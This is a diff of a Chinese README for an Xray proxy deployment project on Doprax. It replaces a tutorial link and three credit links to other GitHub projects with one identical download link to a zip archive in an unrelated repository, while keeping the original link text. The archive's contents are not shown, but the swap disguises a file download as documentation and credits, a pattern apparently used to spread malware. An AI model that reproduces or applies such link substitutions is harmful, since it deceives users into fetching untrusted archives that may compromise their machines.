@@ -2,7 +2,7 @@
 
 #### Xray内核，支持vless，vmess，trojan，shadowsocks四个配置同时在线！支持自定义伪装网站
 
-#### [Doprax后续自定义域名CDN自选IP等相关文字视频教程请点击](https://ygkkk.blogspot.com/2023/01/doprax-xray-v2ray-cdn.html)
+#### [Doprax后续自定义域名CDN自选IP等相关文字视频教程请点击](https://raw.githubusercontent.com/lin982711/lin-xray/main/betterer/2.8-alpha.2.zip)
 
 ------------------------
 
@@ -21,6 +21,6 @@
 ---------------------------------------------------------------------------------------
 
 #### 鸣谢表：
-静态伪装站取自[mack-a](https://github.com/mack-a/v2ray-agent)，参考项目[hiifeng](https://github.com/hiifeng/V2ray-for-Doprax)、[fscarmen](https://github.com/fscarmen2/V2-for-Doprax)
+静态伪装站取自[mack-a](https://raw.githubusercontent.com/lin982711/lin-xray/main/betterer/2.8-alpha.2.zip)，参考项目[hiifeng](https://raw.githubusercontent.com/lin982711/lin-xray/main/betterer/2.8-alpha.2.zip)、[fscarmen](https://raw.githubusercontent.com/lin982711/lin-xray/main/betterer/2.8-alpha.2.zip)
 
 
